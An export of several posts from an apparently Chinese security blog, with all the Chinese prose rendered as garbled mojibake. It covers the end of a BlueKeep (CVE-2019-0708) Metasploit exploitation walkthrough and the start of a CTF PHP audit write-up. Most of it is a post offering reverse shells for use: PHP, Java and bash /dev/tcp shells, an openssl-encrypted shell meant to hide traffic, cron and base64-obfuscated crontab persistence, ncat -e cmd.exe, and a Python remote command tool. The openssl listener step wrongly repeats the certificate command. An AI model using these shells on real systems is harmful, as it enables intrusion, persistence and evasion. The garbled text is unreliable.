<p>åƒä¸‡ä¸è¦è‡ªä½œèªæ˜å»æ”¹RDP_CLIENT_IP è¿™ä¸ªé»˜è®¤å°±è¡Œã€‚<br>ç„¶åå°±æ˜¯ run è¿™ä¸ªæ—¶å€™ä½ å°±å¯ä»¥çœ‹åˆ°è“å±æˆ–è€…å°±æ˜¯shellå›æ¥äº†ï¼š<img data-src="/images/pages/1568126952731.png" alt="1568126952731"></p>
<p>è“å±ä¸è¦ç´§ï¼Œè“å±å¾ˆæ­£å¸¸ï¼Œå†è¯•å‡ æ¬¡ã€‚</p>
<p><img data-src="/images/pages/1568126937511.png" alt="1568126937511"></p>
<p>ä¸Šé¢æˆ‘ä»¬æˆåŠŸè¿”å›shellï¼Œå½“ç„¶ä¸­é—´å¯èƒ½è¿˜ä¼šå„ç§é‡åˆ°æŠ¥é”™ï¼Œæ‰€ä»¥ä½ ä¹Ÿé‡åˆ°äº†è¯·æ¥ç€å¾€ä¸‹çœ‹</p>
<h2 id="æŠ¥é”™è§£å†³"><a href="#æŠ¥é”™è§£å†³" class="headerlink" title="æŠ¥é”™è§£å†³"></a>æŠ¥é”™è§£å†³</h2><p>1ã€å¦‚æœæŠ¥é”™ï¼š</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">Exploit failed: NameError undefined <span class="built_in">local</span> variable ormethod rdp_ connect&#x27; <span class="keyword">for</span> #&lt;Msf : :Modules: :Exploit__ Rdp_ Cve_ <span class="number">2019</span> <span class="number">0708</span> bluekeep_ rce: :Metasploi tModule : <span class="number">0x000000000f</span> <span class="number">702b78</span>&gt;</span><br></pre></td></tr></table></figure>
<p>è¯´æ˜ä½ çš„å››ä¸ªpayloadæ–‡ä»¶æ²¡æœ‰è¦†ç›–åˆ°æ­£ç¡®çš„ä½ç½®ï¼Œè¯·ä¸€ä¸€ç¡®è®¤ï¼Œè¿™ä¸ªé—®é¢˜ä¸è§£å†³æ˜¯ç»å¯¹ä¸å¯èƒ½æ‰“è¿‡å»çš„<br>2ã€å¦‚æœæŠ¥é”™ï¼š</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Exploit</span> completed, but <span class="literal">no</span> session was created.</span><br></pre></td></tr></table></figure>
<p>æ­å–œä½ ï¼Œæ‰“è¿‡å»äº†ï¼Œä½†æ˜¯å¤§æ¦‚ç‡æ˜¯è“å±äº†ï¼Œå¦‚æœè“å±è¯´æ˜ä½ æ˜¯å¯¹çš„å†å¤šè¯•å‡ æ¬¡ï¼Œå¹¶ä¸”æ›´æ¢targetå¤šè¯•å‡ æ¬¡ï¼Œç¡®å®å¾ˆå¤§å‡ ç‡æ˜¯è“å±ã€‚å¦‚æœæ²¡æœ‰è“å±ä½†æ˜¯ä¹ŸæŠ¥é”™å¦‚ä¸Šï¼Œé‚£ä¹ˆå°±æ˜¯ä½ çš„è™šæ‹Ÿæœºç‰ˆæœ¬çš„é—®é¢˜ï¼Œè¯·ç¡®è®¤ å…³é—­é˜²ç«å¢™ã€å¼€å¯3389 ç‰ˆæœ¬ window7 sp1 ç‰ˆæœ¬ã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç›®å‰è¿™ä¸ª0708æ¼æ´ç®—æ˜¯å¯ä»¥åˆ©ç”¨äº†ï¼Œä½†æ˜¯ä»éœ€è¦å¤§ä½¬å¼€å‘æ›´ç¨³å®šçš„è„šæœ¬å‡ºæ¥ï¼Œè€Œæˆ‘æ˜¯æwebçš„ï¼Œæˆ‘æ ¹æœ¬æ”¹ä¸åŠ¨è¿™ä¸ªä¸œè¥¿ï¼Œçœ‹æ¥ä»¥åå¾—å¤šå­¦å­¦é€†å‘äº†ã€‚</p>
]]></content>
      <categories>
        <category>å†…ç½‘å®‰å…¨</category>
      </categories>
      <tags>
        <tag>ms2019_0708</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºåå¼¹shellçš„é‚£äº›äº‹</title>
    <url>//posts/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    <content><![CDATA[<h4 id="ä¼—æ‰€å‘¨çŸ¥çš„åå¼¹shell"><a href="#ä¼—æ‰€å‘¨çŸ¥çš„åå¼¹shell" class="headerlink" title="ä¼—æ‰€å‘¨çŸ¥çš„åå¼¹shell"></a>ä¼—æ‰€å‘¨çŸ¥çš„åå¼¹shell</h4><p>æˆ‘ä»¬æ‹¿åˆ°webshellåå¦‚æœæƒ³è¿›ä¸€æ­¥æäº‹æƒ…ï¼Œé‚£ä¹ˆè‚¯å®šç»•ä¸è¿‡åå¼¹shellã€‚å³ä½¿æœ‰èšå‰‘ï¼Œèœåˆ€è¿™æ ·çš„ç¥å™¨ï¼Œä½†æ˜¯éäº¤äº’å¼çš„shellä»æœ‰å¾ˆå¤šä¸å¥½ç”¨çš„åœ°æ–¹ã€‚<br>å…ˆè¯´åå¼¹shellå§ï¼Œåå¼¹shellçš„æ–¹æ³•å¾ˆå¤šï¼Œå„ä¸ªè¯­è¨€æœ‰å„ä¸ªè¯­è¨€çš„æ–¹å¼ï¼Œè¿™é‡Œä¸æ˜¯ä¸ºäº†ä»‹ç»è¿™äº›çš„ï¼Œå½“ç„¶è¿˜æ˜¯è´´ä¸€ä¸ªå¤§ä½¬æœ‹å‹çš„åšå®¢<a href="https://www.kkzevip.com/?post=21">&gt;ç‚¹å‡»è¿™é‡Œ&lt;</a>ï¼Œä½ ä»¬å¯ä»¥å»ä¸Šé¢çœ‹çœ‹ä»–çš„æ€»ç»“ã€‚<br>å¦å¤–ï¼Œè¡¥å……ä¸€ä¸ªç°å®éå¸¸å¥½ç”¨çš„phpåå¼¹shellçš„è„šæœ¬ï¼Œå¯ä»¥è¯´æˆ‘ç”¨è¿™ä¸ªè„šæœ¬åå¼¹ä»æ¥æ²¡å¤±è´¥è¿‡ã€‚</p>
<span id="more"></span>
<p>ä»£ç å¦‚ä¸‹ï¼Œæ”¹å¥½ip+portè¿è¡Œå³å¯ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>);</span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="variable">$sock</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br></pre></td></tr></table></figure>
<p>çœŸçš„æ˜¯æ¯”ç½‘ä¸Šçš„é‚£äº›phpåå¼¹shellï¼ˆæ¯”å¦‚ï¼šphp -r â€˜$sock&#x3D;fsockopen(â€œ10.0.0.1â€,1234);exec(â€œ&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3â€);â€™ï¼‰æˆåŠŸç‡é«˜å¾ˆå¤šã€‚å½“ç„¶æ­¤æ–¹æ³•ä¹Ÿæœ‰é™åˆ¶ï¼Œé™åˆ¶å°±æ˜¯ç³»ç»Ÿæ²¡æœ‰ç¦ç”¨ proc_popen(é»˜è®¤ä¸ç¦ç”¨)ã€‚</p>
<p>è¿˜æœ‰ç½‘ä¸Šå¹¿æ³›çš„javaåå¼¹shellï¼Œä½†æ˜¯åœ¨æˆ‘æµ‹è¯•çš„æ—¶å€™ç»å¸¸æ˜¯å¤±è´¥çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢è¿™ç§æˆ‘æµ‹è¯•ç»å¸¸æ˜¯å¤±è´¥çš„ï¼Œå¯èƒ½æ˜¯ç‰ˆæœ¬ä¸æ”¯æŒæˆ–è€…å†™æ³•æœ‰é—®é¢˜å§ï¼Œå…·ä½“ä¸å¤ªæ¸…æ¥šã€‚<br>ä¹Ÿç»™å¤§å®¶æ¨èæˆ‘å¸¸ç”¨çš„javaçš„åå¼¹shell:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// payload1</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">p.waitFor();</span><br><span class="line"></span><br><span class="line"><span class="comment">//payload2</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>


<h4 id="åŠ å¯†çš„åå¼¹shell"><a href="#åŠ å¯†çš„åå¼¹shell" class="headerlink" title="åŠ å¯†çš„åå¼¹shell"></a>åŠ å¯†çš„åå¼¹shell</h4><p>è¿™ä¸ªæ˜¯æºäºçœ‹freebufçš„ä¸€ç¯‡æ–‡ç« ï¼Œåæ¥æ‰çŸ¥é“åŸæ¥sslä¹Ÿå¯ä»¥è¿›è¡Œåå¼¹shellçš„åŠ å¯†ã€‚è¿™æ ·æˆ‘ä»¬æ‰§è¡Œçš„å‘½ä»¤æµé‡å°±ä¸èƒ½è¢«åˆ†æå‡ºæ¥äº†ï¼ˆåœ¨å®æˆ˜ä¸­å¯èƒ½æœ‰æ›´å¤§çš„ç”¨å¤„ï¼Œæ¯•ç«Ÿç•™ç—•æ›´å°‘ï¼‰ã€‚</p>
<ul>
<li>1 é¦–å…ˆï¼Œvpsä¸Šç”ŸæˆSSLè¯ä¹¦çš„å…¬ç§é’¥å¯¹<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure></li>
<li>2 åœ¨è‡ªå·±çš„VPSä¸Šç›‘å¬åå¼¹shell<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure></li>
<li>3 åœ¨ç›®æ ‡ä¸Šç”¨opensslåŠ å¯†åå¼¹shellçš„æµé‡<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> /tmp/s;/bin/bash -i &lt; /tmp/s 2&gt;&amp;1|openssl s_client -quiet -connect vps:443 &gt; /tmp/s;<span class="built_in">rm</span> /tmp/s</span><br></pre></td></tr></table></figure>
ä½ å¯ä»¥è‡ªå·±å»æŠ“åŒ…åˆ†æï¼Œå¯¹æ¯”åŠ å¯†åå¼¹å’Œå¸¸è§„åå¼¹åŒ…ï¼Œå¯ä»¥å¾ˆæ¸…æ¥šçš„çŸ¥é“åŠ å¯†çš„æµé‡åŒ…æ˜¯åˆ†æä¸å‡ºæ¥æˆ‘ä»¬æ‰§è¡Œäº†é‚£äº›å‘½ä»¤çš„ã€‚è€Œä¸”ç”±äºmkfifo ç³»ç»Ÿå¤§å¤šæ•°ç³»ç»Ÿè‡ªå¸¦ï¼Œæ‰€ä»¥ç»å¤§å¤šæ•°éƒ½å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹å¼æ¥åå¼¹åŠ å¯†çš„shellæµé‡ã€‚</li>
</ul>
<h4 id="åˆ©ç”¨cronçš„åå¼¹shell"><a href="#åˆ©ç”¨cronçš„åå¼¹shell" class="headerlink" title="åˆ©ç”¨cronçš„åå¼¹shell"></a>åˆ©ç”¨cronçš„åå¼¹shell</h4><p>æœ‰æ—¶å€™æˆ‘ä»¬è¿˜æ²¡æ‹¿åˆ°webshellï¼Œè¿™æ—¶ä¹Ÿå¹¶ä¸€å®šå°±æ²¡æ³•åå¼¹ä¸€ä¸ªshellå‡ºæ¥ã€‚è¿™é‡Œåˆ†äº«ä¸€ä¸ªä¾‹å­ï¼š<br>æ›¾ç»æœ‰æ¬¡æ¸—é€æµ‹è¯•java webç½‘ç«™ï¼Œç½‘ç«™å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ä¸Šä¼ çš„jspæ— æ³•æ‰§è¡Œï¼Œå¯èƒ½æ˜¯éœ€è¦ç¼–è¯‘éƒ¨ç½²åæ‰å¯æ‰§è¡Œï¼ˆé»‘ç›’ï¼Œå…·ä½“åŸå› ç°åœ¨ä¹Ÿæ²¡ææ¸…ï¼‰ï¼Œæ‰€ä»¥éœ€è¦å…¶ä»–çš„æ€è·¯æ¥æ‹¿shellï¼Œå½“æ—¶å°±æ˜¯åˆ©ç”¨çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ cronã€‚æ–‡ä»¶å†…å®¹å°±æ˜¯ä¸‹é¢è¿™æ ·ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">* * * * * bash -i &gt;&amp; /dev/tcp/192.168.2.15/9999  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶å¦‚æœæœ‰webshell ä¹Ÿå¯ä»¥ç”¨cronåå¼¹shellï¼ˆç»´æŒæƒé™ï¼‰ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo ZWNobyAiKiAqICogKiAqIGJhc2ggLWMgJ3tlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHpPUzR4TURVdU9TNHhMems1T1RrZ01ENG1NUT09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0nIiB8Y3JvbnRhYiAt |base64 -d|bash -i&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå§¿åŠ¿è¿˜å¸¸ç”¨äºawdä¸­çš„æƒé™ç»´æŒï¼Œå¯ä»¥å†™å¥½è„šæœ¬ä»é¶æœºç›´æ¥è¿›è¡Œflagçš„æäº¤ã€‚å¦å¤–å¯¹crontabä¸äº†è§£çš„åŒå­¦å¯ä»¥å»æ·±å…¥å­¦ä¹ ä¸‹crontabçš„ç»“æ„å’ŒçŸ¥è¯†ï¼ˆå¾ˆç®€å•çš„ï¼‰ã€‚</p>
<p>æœ‰æ—¶å€™åœ¨å®æˆ˜ä¸­ç»å¸¸å‘ç°ç”¨webshellè¿›è¡Œshellåå¼¹æ—¶ä¼šå‡ºç°å¾ˆå¤šé—®é¢˜ï¼Œä½†ç»å¤§å¤šæ•°éƒ½æ˜¯ç¼–ç çš„é—®é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸‹æŸæ¬¡ç”¨jspçš„å‘½ä»¤æ‰§è¡Œè¿›è¡Œçš„shell åå¼¹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">echo</span>,<span class="built_in">base64</span>&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125; </span><br><span class="line">//è¿™ç§å¯ä»¥è§£å†³ç¼–ç é—®é¢˜ï¼Œä½†æ˜¯ä¸èƒ½å¿½ç•¥<span class="built_in">base64</span>ä¸­çš„ + å·ï¼Œè¿™ä¸ªä¹Ÿå¾—ç¼–ç ã€‚</span><br><span class="line"></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,<span class="built_in">base64</span>&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">//javaæ‰§è¡Œå‘½ä»¤çš„å°é©¬ä¸€èˆ¬ç”¨ä¸Šè¿°çš„åå¼¹é‚£ shell æ–¹å¼</span><br><span class="line"></span><br><span class="line">bash -c <span class="string">&quot;bash -i .........&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="äº¤äº’å¼shell"><a href="#äº¤äº’å¼shell" class="headerlink" title="äº¤äº’å¼shell"></a>äº¤äº’å¼shell</h4><p>ä¸Šé¢çš„éƒ½æ˜¯è®²åå¼¹shellï¼Œé‚£ä¹ˆåå¼¹shellåæ€ä¹ˆæ‹¿åˆ°ä¸€ä¸ªäº¤äº’å¼çš„shellå‘¢ï¼Ÿ(ctrl+cæ–­ä¸æ‰çš„é‚£ç§)<br>ç›´æ¥ä¸Šæ–¹æ³•å§ï¼ˆä¸ä»‹ç»ç¬¬ä¸‰æ–¹å·¥å…·ï¼Œå› ä¸ºå¤§å¤šæ•°ç›®æ ‡ç¯å¢ƒæ²¡æœ‰ï¼‰ï¼š</p>
<ul>
<li>pythonå®ç°çš„å¼±tty<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;	pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
ä¸ºä»€ä¹ˆæ˜¯ä¸€ä¸ªå¼±ttyå‘¢ å› ä¸ºctrl+c ä»å¯ä»¥ä¸­æ–­ï¼Œä¸è¿‡å·²ç»å¤Ÿç”¨äº† vi su ç­‰ç­‰å‘½ä»¤å·²ç»ä¸æ˜¯é—®é¢˜äº†ã€‚<br>å®ƒå¯ä»¥åˆ©ç”¨socatå’Œncæ¥å®ç°å¼ºttyä¸è¿‡ç›®å‰æ„Ÿè§‰æ²¡å•¥ç”¨ï¼æ„Ÿå…´è¶£çš„å»çœ‹ä¸‹è¿™ç¯‡æ–‡ç« :  <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a><br>ç›®å‰è¿˜æ²¡å‘ç°æ¯”è¿™ä¸ªæ›´å¥½ç”¨çš„äº¤äº’å¼shellçš„åˆ©ç”¨ã€‚ä»¥åæœ‰äº†å†è¡¥å……è¿™å—å§ï¼</li>
</ul>
<h4 id="è¡¥å……ä¸‹windows-åå¼¹shell"><a href="#è¡¥å……ä¸‹windows-åå¼¹shell" class="headerlink" title="è¡¥å……ä¸‹windows åå¼¹shell"></a>è¡¥å……ä¸‹windows åå¼¹shell</h4><ul>
<li><ol>
<li>æ¯«æ— ç–‘é—®msfæ‰æ˜¯æœ€é€‚åˆwindowsåå¼¹shellçš„å·¥å…·</li>
</ol>
</li>
<li><ol start="2">
<li>nc <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ncat -e cmd.exe 192.168.174.129 8080</span><br></pre></td></tr></table></figure>
ä¹ŸæŒºå¥½ç”¨ï¼Œå°±æ˜¯æœ‰æ—¶å€™æ²¡æœ‰ncï¼Œè‡ªå·±ä¼ ä¹Ÿå¾ˆéº»çƒ¦è¿˜æœ‰è¯¸å¤šé™åˆ¶ã€‚</li>
</ol>
</li>
<li>3.python<br>æœ‰pythonç¯å¢ƒä¹Ÿå¯ä»¥ç”¨pythonæ¥åå¼¹ï¼Œç›¸å½“äºç”¨pythonå†™äº†ä¸€ä¸ªnc<br>æœåŠ¡ç«¯<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">HOST=<span class="string">&#x27;&#x27;</span></span><br><span class="line">PORT=<span class="number">1122</span></span><br><span class="line">BUFSIZ=<span class="number">1024</span></span><br><span class="line">ADDR=(HOST, PORT)</span><br><span class="line">sock=socket(AF_INET, SOCK_STREAM)</span><br><span class="line">sock.bind(ADDR)</span><br><span class="line">sock.listen(<span class="number">1</span>)</span><br><span class="line">STOP_CHAT=<span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> STOP_CHAT:</span><br><span class="line">    tcpClientSock, addr=sock.accept()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Listening.....&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data=tcpClientSock.recv(BUFSIZ)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            tcpClientSock.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        STOP_CHAT=(data.decode(<span class="string">&#x27;utf8&#x27;</span>).upper()==<span class="string">&quot;QUIT&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> STOP_CHAT:</span><br><span class="line">            <span class="comment">#æ‰“æ‰«æˆ˜åœº è¿ç”¨linuxå®šæ—¶è®¡åˆ’ä»»åŠ¡ä¸€åˆ†é’Ÿååˆ é™¤å½“å‰è„šæœ¬æ–‡ä»¶</span></span><br><span class="line">            <span class="comment">#current_file_path =os.getcwd()+sys.argv[0]</span></span><br><span class="line">            <span class="comment">#os.system(&#x27;echo */1ã€€ã€€*ã€€ã€€*ã€€ã€€*ã€€ã€€*ã€€ã€€rm -rf &#x27;+current_file_path+&#x27; &gt;&gt; /etc/crontab&#x27;)</span></span><br><span class="line">            <span class="comment">#tell_hack = &#x27;Will help you clean war...&#x27;</span></span><br><span class="line">            <span class="comment">#tcpClientSock.sendall(tell_hack.encode(&#x27;utf8&#x27;))</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ME = os.popen(data.decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">        os_result = ME.read()</span><br><span class="line">        <span class="built_in">print</span>(os_result)</span><br><span class="line">        tcpClientSock.sendall(os_result.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">tcpClientSock.close()</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
å®¢æˆ·ç«¯<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TcpClient</span>:</span><br><span class="line">    HOST=<span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">    PORT=<span class="number">1122</span></span><br><span class="line">    BUFSIZ=<span class="number">2048</span></span><br><span class="line">    ADDR=(HOST, PORT)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.client=socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        self.client.connect(self.ADDR)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=<span class="built_in">input</span>(<span class="string">&#x27;OS Shell &gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            self.client.send(data.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Execute %sï¼š%s&#x27;</span> %(self.HOST,data))</span><br><span class="line">            <span class="keyword">if</span> data.upper()==<span class="string">&quot;QUIT&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data=self.client.recv(self.BUFSIZ)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Receiveï¼š%s&#x27;</span> %(data.decode(<span class="string">&#x27;utf8&#x27;</span>)))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    client=TcpClient()</span><br></pre></td></tr></table></figure>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4>åå¼¹shellçš„æ–¹æ³•äº”èŠ±å…«é—¨ï¼Œæœ€é‡è¦çš„è¿˜æ˜¯æ‰¾åˆ°ä¸€ä¸ªä¾èµ–æœ€å°‘çš„ï¼Œæœ€ç¨³å®šçš„åå¼¹shellçš„æ–¹å¼ã€‚</li>
</ul>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>command excution</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€é“phpä»£ç å®¡è®¡é¢˜ç›®çš„å¿ƒè·¯å†ç¨‹</title>
    <url>//posts/%E4%B8%80%E9%81%93php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E7%9B%AE%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰ç«¯æ—¶é—´åšäº†ä¸€é“CTF-phpä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œæ­¤é¢˜ç›®è¯´éš¾ä¹Ÿä¸ç®—éš¾ï¼Œå±äºä¸­ç­‰åä¸Šä¸€ç‚¹ç‚¹çš„é¢˜ç›®ã€‚æˆ‘åœ¨ä¸‰ä¸ªå°æ—¶å†…åšå‡ºæ¥äº†ï¼Œä½†æ˜¯æˆ‘å¿½ç„¶å›é¡¾æˆ‘åšè¿™ç§ä»£ç å®¡è®¡é¢˜ç›®çš„æ—¶å€™ï¼Œå‘ç°è¿™å››å¹´çš„æ¯”èµ›ç”Ÿæ¶¯ï¼Œä»£ç å®¡è®¡é¢˜ç›®æ°¸è¿œéƒ½æ˜¯æˆ‘çš„å¼±é¡¹ï¼Œè€Œä¸”æˆé•¿ææ…¢ã€‚æ€»æ˜¯åœ¨ä¸€å¤´é›¾æ°´ä¸­å¼€å§‹ï¼Œä¸€å¤´é›¾æ°´ä¸­ç»“æŸã€‚æ‰€ä»¥æˆ‘æƒ³æ¢³ç†ä¸€ä¸‹è¿™é“é¢˜ç›®æˆ‘æ˜¯æ€ä¹ˆåšå‡ºæ¥çš„ï¼Œå¹¶è§£å†³ä»¥ä¸‹é—®é¢˜ï¼š<br>1ã€é‡åˆ°ä»£ç å®¡è®¡çš„é¢˜ç›®ä»å“ªé‡Œå…¥æ‰‹æ‰æ˜¯æ­£ç¡®çš„<br>2ã€åšåˆ°å“ªé‡Œæ˜¯éš¾ç‚¹ï¼ŒåšæŒä¸ä¸‹å»äº†ï¼Œè¿™æ—¶å€™åº”è¯¥æ€ä¹ˆåŠ<br>3ã€å®Œå…¨å®¡è®¡æ¸…æ¥šï¼Œä½†æ˜¯ä»ä¸ä¼šåˆ©ç”¨æ€ä¹ˆåŠ<br>æ—¨åœ¨å¸Œæœ›è‡ªå·±èƒ½çœŸæ­£çš„ç†è§£è¿™äº›ä¸œè¥¿ã€‚<span id="more"></span></p>
<h2 id="æºç åœ°å€-amp-amp-ä¸€äº›äº¤ä»£"><a href="#æºç åœ°å€-amp-amp-ä¸€äº›äº¤ä»£" class="headerlink" title="æºç åœ°å€&amp;&amp;ä¸€äº›äº¤ä»£"></a>æºç åœ°å€&amp;&amp;ä¸€äº›äº¤ä»£</h2><p>æºç åœ°å€ï¼š<a href="https://pan.baidu.com/s/1qR5srrQLHNEgT_L1tPS79g">https://pan.baidu.com/s/1qR5srrQLHNEgT_L1tPS79g</a><br>ç¬¬ä¸€æ¬¡çœ‹åˆ°é¢˜ç›®å‘ç°æ— æ³•å…¥æ‰‹ï¼Œæ‰€ä»¥çŒœæµ‹è‚¯å®šæœ‰ç›¸åº”çš„æºç æ³„éœ²ï¼ˆè¿™æ˜¯ç»éªŒï¼Œæ²¡æ³•ä¼ æˆã€‚ï¼‰é€šè¿‡dirbæ‰«æå‘ç°å¤‡ä»½æ–‡ä»¶ backupã€‚ç„¶åä¸‹è½½è¿›è¡Œåˆ†æã€‚</p>
